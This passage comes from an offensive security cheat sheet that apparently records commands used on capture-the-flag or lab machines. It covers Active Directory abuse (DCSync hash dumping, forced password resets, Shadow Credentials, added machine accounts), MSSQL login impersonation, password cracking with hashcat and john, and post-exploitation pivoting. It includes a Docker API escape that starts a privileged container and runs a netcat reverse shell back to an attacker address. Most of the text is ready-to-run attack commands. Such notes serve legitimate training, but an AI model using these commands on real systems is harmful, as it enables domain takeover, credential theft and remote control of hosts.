nxc winrm <ip> -u '<user>' -p '<pass>'
```
Check WinRM access before spending time on evil-winrm — `(Pwn3d!)` in the output confirms admin-equivalent access. (Forest)

```sh
impacket-psexec <user>@<domain>
```
PSExec-style SMB admin shell (SYSTEM) once you have local admin creds — used as the final step after cracking a Kerberoast hash for Administrator. (Active)

### Privilege / ACL Abuse
```sh
net user <newuser> <newpass> /add /domain
net group "<group>" <user> /add /domain
```
Create a domain user and add it to a group you (or a compromised account) have `GenericWrite`/`GenericAll` over — e.g. adding into `Exchange Windows Permissions` for its `WriteDACL` on the domain object. (Forest)

```sh
pipx install bloodyad
bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<pass>' add dcsync 'DC=<domain>,DC=com'
bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<pass>' get object 'CN=<user>,CN=Users,DC=<domain>,DC=com'
```
Attempt to grant DCSync rights via ACL write, then confirm the resulting SID. (Forest — inconsistent results)

```sh
impacket-secretsdump <domain>/<user>:<pass>@<dc_ip> -just-dc-ntlm
```
DCSync dump of NTLM hashes once an account has `Replicating Directory Changes` rights. (Forest, Hokkaido — attempted)

```sh
rpcclient -U '<user>%<pass>' <dc_ip>
setuserinfo2 <TARGET_USER> 24 '<newpass>'
```
Force-reset another user's password over RPC using a `ForceChangePassword` ACL edge (level `24` = force change, no old password needed; level `23` requires the old password). (Hokkaido)

```sh
impacket-addcomputer -dc-ip <dc_ip> -domain <domain> -computer-name '<NAME>$' -computer-pass '<pass>' '<domain>/<user>:<pass>'
```
Add a machine account to the domain (useful for RBCD/Shadow Credential attacks when the acting user has `ms-DS-MachineAccountQuota`). (Hokkaido)

```sh
pip install pywhisker
pywhisker -d <domain> -u '<user>' -p '<pass>' --dc-ip <dc_ip> --target '<TARGET>$' --action add
```
Shadow Credentials attack — add a certificate-based "shadow" credential to a target account for direct auth (requires `GenericWrite` on target — failed here due to insufficient rights). (Hokkaido — stuck)

### MSSQL as an AD attack vector
```sh
impacket-mssqlclient -windows-auth <domain>/<user>:<pass>@<dc_ip>
```
Connect to MSSQL with domain creds via Windows auth.

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
EXECUTE AS LOGIN = '<impersonatable_login>';
SELECT * FROM <db>.INFORMATION_SCHEMA.TABLES;
```
Enumerate MSSQL role membership and impersonation rights, then use `EXECUTE AS LOGIN` to pivot to a more privileged SQL login and read tables containing plaintext creds. (Hokkaido)

### RDP
```sh
xfreerdp /cert:ignore /dynamic-resolution +clipboard /u:'<user>' /p:'<pass>' /v:<host>
rdesktop -u <user> -p <pass> <host>:3389
```
RDP client one-liners once you have valid domain/local creds. (Hokkaido, Nickel, Fish)

---

## 9. Password Cracking

```sh
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```
Unzip rockyou before first use on a fresh Kali install (almost every box).

```sh
hashcat -m 13100 <hashfile> /usr/share/wordlists/rockyou.txt --show
```
Kerberoast (TGS-REP) hashes. (Active, Forest, Hokkaido)

```sh
hashcat -m 18200 <hashfile> /usr/share/wordlists/rockyou.txt --force --show
```
AS-REP roast hashes. (Forest)

```sh
hashcat -m 1800 '<sha512crypt_hash>' /usr/share/wordlists/rockyou.txt --show
```
`/etc/shadow` SHA-512 crypt hashes (`$6$...`). (Wheels)

```sh
hashcat -O -m 0 <hashfile> /usr/share/wordlists/rockyou.txt
```
Raw unsalted MD5. (Monster — insufficient, salt was needed)

```sh
hashcat -O -m 2600 <hashfile> --wordlist /usr/share/wordlists/rockyou.txt -r rule.txt --show
```
Double-MD5 with a static application salt appended via a hashcat rule file (`$<salt>` rule) — used when a CMS (Monstra) concatenates a hardcoded salt before hashing. (Monster)

```sh
hashcat -m 400 ./hashes /usr/share/wordlists/rockyou.txt --show
```
WordPress/phpass portable hashes (`$P$...`). (Workaholic)

```sh
hashcat -m 3600 -a 0 secret.hash /usr/share/wordlists/rockyou.txt
hashcat -m 1500 -a 0 secret.hash /usr/share/wordlists/rockyou.txt
```
Zip-crypto (`-m 3600`) then classic DES `crypt()` (`-m 1500`) tried against a stolen VNC/zip secret. (Poison)

```sh
john <hashfile> --wordlist=/usr/share/wordlists/rockyou.txt --show
```
General-purpose John cracking — used against a Kerberoast hash, an `.htpasswd` (APR1-MD5), and a PDF hash. (Access, AuthBy)

```sh
pdf2john Infrastructure.pdf > Infrastructure.hash
john Infrastructure.hash --wordlist=/usr/share/wordlists/rockyou.txt
```
Crack a password-protected PDF. (Nickel)

```sh
echo -n '<base64_string>' | base64 -d
```
Decode base64-encoded credentials found in leaked config/process listings (e.g. a `DevTasks.exe` commandline argument). (Nickel)

---

## 10. Post-Exploitation / Persistence / Pivoting

```sh
ssh -L <local_port>:127.0.0.1:<remote_port> <user>@<host>
vncviewer -passwd ./secret localhost:<local_port>
```
SSH local port-forward to reach a service (VNC) only bound to the victim's loopback interface; a stolen binary VNC "secret" file can be passed directly to `vncviewer -passwd`. (Poison)

```sh
curl http://<docker_api_host>:2375/version
curl -X POST -H "Content-Type: application/json" \
  --data '{"Image":"alpine:latest","HostConfig":{"Binds":["/:/mnt/root"],"Privileged":true},"Cmd":["sh","-c","nc <attacker_ip> <port> -e sh"]}' \
  http://<docker_api_host>:2375/containers/create
curl -X POST http://<docker_api_host>:2375/containers/<id>/start
```
Docker Engine API exposed without auth — create a privileged container that bind-mounts the host root (`/` → `/mnt/root`) to read/write host files or spawn a reverse shell as root, escaping a WSL2 Docker sandbox. (MonitorsFour)

```sh
net user <user> /domain
net group /domain
net group "<group>" <user> /add /domain
```
Enumerate/modify domain group membership from an already-compromised low-priv AD account to walk a BloodHound-identified privesc path. (Forest)

```powershell
New-Item -ItemType Junction -Path "C:\Users\<user>\MountPoint" -Target "C:\Windows\Microsoft.NET\Framework\v4.0.30319"
```
NTFS junction abuse — trick a privileged process (antivirus quarantine/restore) into writing an attacker-controlled file into a protected system directory. (Fish)

```sh
wget https://github.com/windowsoffender/compiled_binaries   # SharpWSUS.exe
```
Attempted to abuse local `WSUS Administrators` group membership via SharpWSUS to push a malicious update package as SYSTEM; blocked by Windows Defender in practice. (Hokkaido — stuck)

```sh
xfreerdp /cert:ignore /u:'<user>' /p:'<pass>' /v:<host> +clipboard
```
RDP back in as a newly-created/escalated user to collect further loot or pivot further (clipboard sharing enabled for easy file/text transfer). (Hokkaido, Nickel)

